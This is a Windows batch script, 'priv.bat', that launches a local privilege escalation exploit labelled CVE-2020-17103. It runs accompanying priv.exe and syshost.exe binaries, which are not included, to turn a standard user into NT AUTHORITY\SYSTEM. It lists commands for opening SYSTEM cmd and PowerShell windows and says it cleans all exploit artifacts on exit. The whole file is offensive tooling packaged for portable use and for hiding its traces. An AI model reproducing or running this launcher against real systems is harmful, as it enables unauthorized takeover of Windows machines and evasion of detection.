@echo off
setlocal EnableDelayedExpansion
title PRIV - Escalation Tool

:: ============================================================
:: priv.bat - Standalone portable SYSTEM shell
:: Portable: drop this bat + syshost.exe + priv.exe in same folder and run.
:: Does NOT install anything. Cleans all artifacts on exit.
:: ============================================================

cls
echo.
echo  +------------------------------------------+
echo  ^|  PRIV  ^|  CVE-2020-17103                 ^|
echo  ^|  Standard User -^> NT AUTHORITY\SYSTEM    ^|
echo  +------------------------------------------+
echo.
echo  Inside the SYSTEM shell you can type:
echo    power        - switch to PowerShell (same window)
echo    cmdnew       - new SYSTEM cmd window
echo    psnew        - new SYSTEM PowerShell window
echo    unpriv       - exit SYSTEM shell ^& cleanup
echo.
echo  Press any key to begin escalation...
pause >nul

:: Locate tools relative to this bat file
set BAT_DIR=%~dp0
set BAT_DIR=%BAT_DIR:~0,-1%

set PRIV_EXE=%BAT_DIR%\priv.exe
set SYSHOST_EXE=%BAT_DIR%\syshost.exe

if not exist "%PRIV_EXE%" (
    echo [-] priv.exe not found in %BAT_DIR%
    echo     Place priv.exe and syshost.exe in the same folder as this bat.
    pause & exit /b 1
)

if not exist "%SYSHOST_EXE%" (
    echo [-] syshost.exe not found in %BAT_DIR%
    pause & exit /b 1
)

echo.
echo [*] Starting escalation from: %BAT_DIR%
echo.

:: Run priv.exe from the bat's directory (so it finds syshost.exe)
cd /d "%BAT_DIR%"
"%PRIV_EXE%"

echo.
echo [*] Returned to user context.
echo [*] All exploit artifacts have been cleaned.
echo.
pause
